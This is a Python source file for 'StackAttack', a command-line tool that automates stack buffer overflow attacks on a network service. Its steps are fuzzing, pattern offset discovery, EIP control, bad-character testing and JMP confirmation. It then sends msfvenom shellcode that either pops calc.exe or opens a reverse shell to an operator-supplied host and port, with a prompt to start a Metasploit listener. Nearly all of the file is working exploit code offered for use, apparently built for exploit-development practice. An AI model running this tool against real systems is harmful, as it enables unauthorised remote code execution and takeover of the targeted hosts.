'''
StackAttack  Copyright (C) 2021  Michael Catanzaro

Author: Michael Catanzaro
Version History:
01/28/2021 - Rev. 1 Initial Release
01/29/2021 - Rev. 1.1 Added command switch. Added colorama for print statements. Added calc function.
             Added error handling for chars.txt. Added banner.

'''
#!/usr/bin/env python3

import socket
import time
import sys
import argparse
import subprocess
from colorama import init, Fore, Style
init(autoreset=True)

def banner():
    print(f'''{Fore.RED}
         (`-').->`-')    (`-')  _          <-.(`-')              
         ( OO)_ ( OO).-> (OO ).-/ _         __( OO)              
         (_)--\_)/    '._ / ,---.  \-,-----.'-'. ,--.             
         /    _ /|'--...__) \ /`.\  |  .--./|  .'   /             
         \_..`--.`--.  .--'-'|_.' |/_) (`-')|      /)             
         .-._)   \  |  | (|  .-.  |||  |OO )|  .   '              
         \       /  |  |  |  | |  (_'  '--'\|  |\   \             
         `-----'   `--'  `--' `--'  `-----'`--' '--'             
         (`-')  _ (`-')     (`-')    (`-')  _          <-.(`-')  
         (OO ).-/ ( OO).->  ( OO).-> (OO ).-/ _         __( OO)  
         / ,---.  /    '._  /    '._ / ,---.  \-,-----.'-'. ,--. 
         | \ /`.\ |'--...__)|'--...__) \ /`.\  |  .--./|  .'   / 
         '-'|_.' |`--.  .--'`--.  .--'-'|_.' |/_) (`-')|      /) 
        (|  .-.  |   |  |      |  | (|  .-.  |||  |OO )|  .   '  
         |  | |  |   |  |      |  |  |  | |  (_'  '--'\|  |\   \ 
         `--' `--'   `--'      `--'  `--' `--'  `-----'`--' '--' 
        {Style.RESET_ALL}
        {Fore.BLUE}Because stack smashing bytes!{Style.RESET_ALL}
        
        {Fore.YELLOW}StackAttack  Copyright (C) 2021  Michael Catanzaro
        ''')

def msg(name=None):
    return '''stackattack.py
        Fuzzing function:
        [-f -t TARGET -p PORT -s SIZE -i INCREMENT]
        [optional arguments: -c COMMAND]
        Pattern function:
        [-P -t TARGET -p PORT -s SIZE]
        [optional arguments: -c COMMAND]
        Offset function:
        [-o -s SIZE]
        EIP Control function:
        [-e -t TARGET -p PORT -s SIZE]
        [optional arguments: -c COMMAND]
        Bad Characters function:
        [-b -t TARGET -p PORT -s SIZE]
        [optional arguments: -c COMMAND]
        JMP function:
        [-j -t TARGET -p PORT -s SIZE]
        [optional arguments: -c COMMAND]
        Calc function:
        [-C -t TARGET -p PORT -s SIZE -n NOPS]
        [optional arguments: -c COMMAND]
        Shell function:
        [-S -t TARGET -p PORT -s SIZE -n NOPS]
        [optional arguments: -c COMMAND]
        '''

def main():
    sub = False
    parser = argparse.ArgumentParser(description="StackAttack - python module for attacking stack-based buffer overflows.", add_help=False, usage=msg())
    parser.add_argument("-t", "--target", help="Host IP to attack.", type=str)
    parser.add_argument("-p", "--port", help="Host port running service to attack.", type=int)
    parser.add_argument("-f", "--fuzz", help="Fuzz service to find crash point.", action="store_true")
    parser.add_argument("-s", "--size", help="Size of buffer to send in bytes. Also used for pattern creation and filler bytes", type=int)
    parser.add_argument("-i", "--increment", help="Incremental increase of buffer in bytes.", type=int, default=100)
    parser.add_argument("-c", "--command", help="Command to add to buffer if needed.", type=str)
    parser.add_argument("-P", "--pattern", help="Run msf-pattern_create and send pattern to target.", action="store_true")
    parser.add_argument("-o", "--offset", help="Find offset using EIP gained from pattern module.", action="store_true")
    parser.add_argument("-e", "--eipcontrol", help="Send buffer to confirm control of EIP.", action="store_true")
    parser.add_argument("-b", "--badchars", help="Send full list of hex characters to find forbidden charcters.", action="store_true")
    parser.add_argument("-j", "--jmp", help="Confirm JMP address for shell code.", action="store_true")
    parser.add_argument("-C", "--calc", help="Pop calculator program on the target (Windows) to ensure our payload is hitting correctly.", action="store_true")
    parser.add_argument("-S", "--shell", help="Generate shellcode with msfvenom and send to target.", action="store_true")
    parser.add_argument("-n", "--nops", help="Number of nops to add to payload in shell module.", type=int)
    args = parser.parse_args()
    host = args.target
    port = args.port
    size = args.size
    increment = args.increment
    nops = args.nops
    cmd = args.command

    banner()
    if args.fuzz == True:
        if args.target and args.port and args.size is not None:
            fuzz(host, port, size, increment, cmd)
        else:
            parser.error("Fuzz requires target, port, and size. See usage.") 

    if args.pattern == True:
        if args.target and args.port and args.size is not None:
            pattern(host, port, size, cmd)
        else:
            parser.error("Pattern requires target, port, and size. See usage.")

    if args.offset == True:
        if args.size is not None:
            offset(size)
        else:
            parser.error("Offset requires size. See usage.")

    if args.eipcontrol == True:
        if args.target and args.port and args.size is not None:
            eipcontrol(host, port, size, cmd)
        else:
            parser.error("EIP Control requires target, port, and size. See usage.")
    
    if args.badchars == True:
        if args.target and args.port and args.size is not None:
            badchars(host, port, size, cmd)
        else:
            parser.error("Bad Characters requires target, port, and size. See usage.")
    
    if args.jmp == True:
        if args.target and args.port and args.size is not None:
            jmp(host, port, size, cmd)
        else:
            parser.error("JMP requires host, port, and size. See usage.")

    if args.calc == True:
        if args.target and args.port and args.size and args.nops is not None:
            calc(host, port, size, nops, cmd)
        else:
            parser.error("Calc requires host, port, size, and nops. See usage.")

    if args.shell == True:
        if args.target and args.port and args.size and args.nops is not None:
            shell(host, port, size, nops, cmd)
        else:
            parser.error("Shell requires host, port, size, and nops. See usage.")
    
    if len(sys.argv) == 1:
        parser.print_usage()
        parser.exit()
    

def fuzz(host, port, size, increment, cmd):
    while(size < 10000):
        try:
            if cmd is not None:
                cmd_bytes = str.encode(cmd) 
                buffer = cmd_bytes
                buffer += b"A" * size
                buffer += b"\r\n"
                print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer with %s bytes{Fore.BLUE}[*]" % size)
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                connect = s.connect((host, port))    
                s.send(buffer)
                s.recv(1024)
                s.close() 
                time.sleep(2)
                size += increment
            else:
                buffer = b"A" * size
                print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer with %s bytes{Fore.BLUE}[*]" % size)
                s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                connect = s.connect((host, port))
                s.send(buffer)
                s.recv(1024)
                s.close()
                time.sleep(2)
                size += increment
        except:
            print(f"{Fore.RED}\n[*]{Style.RESET_ALL}Could not connect! Either the host is down or you crashed the application. Check your debugger{Fore.RED}[*]")
            sys.exit()


def pattern(host, port, size, cmd):
    try:
        if cmd is not None:
            buffer = cmd
            buffer += subprocess.getoutput(['msf-pattern_create -l {}'.format(size)])
            buffer += "\r\n"
            buffer_bytes = str.encode(buffer)       
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending generated patten. Check debugger for EIP{Fore.BLUE}[*]") 
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))    
            s.send(buffer_bytes)
            s.recv(1024)
            s.close()
        else:
            buffer = subprocess.getoutput(['msf-pattern_create -l {}'.format(size)])
            buffer_bytes = str.encode(buffer)       
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending generated patten. Check debugger for EIP{Fore.BLUE}[*]") 
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))    
            s.send(buffer_bytes)
            s.recv(1024)
            s.close()
    except:
        print(f"{Fore.RED}\n[*]{Style.RESET_ALL}Could not connect! Either the host is down or you crashed the application. Check your debugger{Fore.RED}[*]")

def offset(size):
    eip = input("Please enter the EIP address: ")
    offset = subprocess.getoutput(['msf-pattern_offset -l {} -q {}'.format(size, eip)])
    print(Fore.GREEN + offset +" [*]")

def eipcontrol(host, port, size, cmd):
    try:
        if cmd is not None:
            cmd_bytes = str.encode(cmd)
            buffer = cmd_bytes
            buffer += b"A" * size
            buffer += b"B" * 4
            buffer += b"\r\n"
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer in attempt to control EIP. Check your debugger{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))    
            s.send(buffer)
            s.recv(1024)
            s.close() 
        else:
            buffer = b"A" * size
            buffer += b"B" * 4
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer in attempt to control EIP. Check your debugger{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close()
    except:
        print(f"{Fore.RED}\n[*]{Style.RESET_ALL}Could not connect! Either the host is down or you crashed the application. Check your debugger{Fore.RED}[*]")

def badchars(host, port, size, cmd):
    try:
        open('chars.txt', 'r')
    except FileNotFoundError:
        print(f"{Fore.RED}[*]{Style.RESET_ALL}Cannot find chars.txt! Ensure it is in your pwd{Fore.RED}[*]")
        sys.exit()    
    try:
        n = input("Please enter the number of characters you wish to exclude (0-10): ")
        info = input("Character formats are in hexadecimal format and case sensitive i.e. 01 or 9F. 00 is excluded by default. Press enter to continue...")
        if n == "0":
            with open('chars.txt', 'r') as f:
                eip = f.read()
            eip_bytes = bytes.fromhex(eip)
        elif n == "1":
            forbidden = input("Enter forbidden character: " )
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "2":
            forbidden1 = input("Enter first forbidden character: " )
            forbidden2 = input("Enter second forbidden character: " )
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "3":
            forbidden1 = input("Enter first forbidden character: " )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "4":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "5":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "6":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "7":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "8":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            forbidden8 = input("Enter eighth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '').replace(forbidden8, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "9":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            forbidden8 = input("Enter eighth forbidden character: ")
            forbidden9 = input("Enter ninth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '').replace(forbidden8, '').replace(forbidden9, '')
            eip_bytes = bytes.fromhex(eip)
        elif n == "10":
            forbidden1 = input("Enter first forbidden character:" )
            forbidden2 = input("Enter second forbidden character: " )
            forbidden3 = input("Enter third forbidden character: " )
            forbidden4 = input("Enter fourth forbidden character: ")
            forbidden5 = input("Enter fifth forbidden character: ")
            forbidden6 = input("Enter sixth forbidden character: ")
            forbidden7 = input("Enter seventh forbidden character: ")
            forbidden8 = input("Enter eighth forbidden character: ")
            forbidden9 = input("Enter ninth forbidden character: ")
            forbidden10 = input("Enter tenth forbidden character: ")
            with open('chars.txt', 'r') as f:
                eip = f.read().replace(forbidden1, '').replace(forbidden2, '').replace(forbidden3, '').replace(forbidden4, '').replace(forbidden5, '').replace(forbidden6, '').replace(forbidden7, '').replace(forbidden8, '').replace(forbidden9, '').replace(forbidden10, '')
            eip_bytes = bytes.fromhex(eip)
        else:
            print("Please enter a valid number (0-10)")
            exit
        
        if cmd is not None:
            cmd_bytes = str.encode(cmd)
            buffer = cmd_bytes
            buffer += b"A" * size 
            buffer += b"B" * 4
            buffer += eip_bytes
            buffer += b"\r\n"
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer to find bad characters. Check your debugger. Remove detected characters and resend until successful{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close()
        else:
            buffer = b"A" * size
            buffer += b"B" * 4
            buffer += eip_bytes
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer to find bad characters. Check your debugger. Remove detected characters and resend until successful{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close()
    except:
        print(f"{Fore.RED}\n[*]{Style.RESET_ALL}Could not connect! Either the host is down or you crashed the application. Check your debugger{Fore.RED}[*]")

def jmp(host, port, size, cmd):
    try:
        eip = input("Enter JMP address in hexadecimal format i.e. \\x00\\x01 = 0102: " )
        eip_bytes = bytes.fromhex(eip)
        if cmd is not None:
            cmd_bytes = str.encode(cmd)
            buffer = cmd_bytes
            buffer += b"A" * size
            buffer += eip_bytes
            buffer += b"\r\n"
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer to confirm we land on EIP register{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close
        else:
            buffer = b"A" * size
            buffer += eip_bytes
            print(f"{Fore.BLUE}\n[*]{Style.RESET_ALL}Sending buffer to confirm we land on EIP register{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close
    except:
        print(f"{Fore.RED}\n[*]{Style.RESET_ALL}Could not connect! Either the host is down or you crashed the application. Check your debugger{Fore.RED}[*]")

def calc(host, port, size, nops, cmd):
    try:
        eip = input("Enter JMP address in hexadecimal format: " )
        eip_bytes = bytes.fromhex(eip)
        badchars = input("Enter forbidden characters for payload: " )
        nopsled = "90" * nops
        nop_bytes = bytes.fromhex(nopsled)
        msfpayload = subprocess.getoutput(['msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f raw -b {} --smallest -o calc.txt'.format(badchars)])
        with open('calc.txt', 'rb') as f:
            calc = f.read()
        if cmd is not None:
            cmd_bytes = str.encode(cmd)
            buffer = cmd_bytes
            buffer += b"A" * size
            buffer += eip_bytes
            buffer += nop_bytes
            buffer += calc
            buffer += b"\r\n"
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL}Sending payload. Check for calc.exe instance{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close()
        else:
            buffer = b"A" * size
            buffer += eip_bytes
            buffer += nop_bytes
            buffer += calc
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL}Sending payload. Check for calc.exe instance{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close()
    except:
        print(f"{Fore.RED}\n[*]{Style.RESET_ALL}Could not connect! Either the host is down or you crashed the application. Check your debugger and listener{Fore.RED}[*]")
        
def shell(host, port, size, nops, cmd):
    try:
        eip = input("Enter JMP address in hexadecimal format: " )
        eip_bytes = bytes.fromhex(eip)
        payload = input("Enter payload: " )
        lhost = input("Enter ip for reverse shell: " )
        lport = input("Enter port for reverse shell: ")
        badchars = input("Enter forbidden characters for payload: " )
        nopsled = "90" * nops
        nop_bytes = bytes.fromhex(nopsled)
        msfpayload = subprocess.getoutput(['msfvenom -p {} LHOST={} LPORT={} EXITFUNC=thread -f raw -b {} --smallest -o payload.txt'.format(payload, lhost, lport, badchars)])
        with open('payload.txt', 'rb') as f:
            shell = f.read()
        print(f"{Fore.YELLOW}[*]{Style.RESET_ALL}Payload used for debugging purposes{Fore.YELLOW}[*]{Style.RESET_ALL} \n\n %s" % shell)
        info = input("\nOpen metasploit multi handler exploit module and and listen on address: {} port: {}. Set payload as {}. Press enter when ready...".format(lhost, lport, payload))
        if cmd is not None:
            cmd_bytes = str.encode(cmd)
            buffer = cmd_bytes
            buffer += b"A" * size
            buffer += eip_bytes
            buffer += nop_bytes
            buffer += shell
            buffer += b"\r\n"
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL}Sending payload. Check your listener{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close()
        else:
            buffer = b"A" * size
            buffer += eip_bytes
            buffer += nop_bytes
            buffer += shell
            print(f"{Fore.BLUE}[*]{Style.RESET_ALL}Sending payload. Check your listener{Fore.BLUE}[*]")
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            connect = s.connect((host, port))
            s.send(buffer)
            s.recv(1024)
            s.close()
    except:
        print(f"{Fore.RED}\n[*]{Style.RESET_ALL}Could not connect! Either the host is down or you crashed the application. Check your debugger and listener{Fore.RED}[*]")

if __name__ == "__main__":
    main()
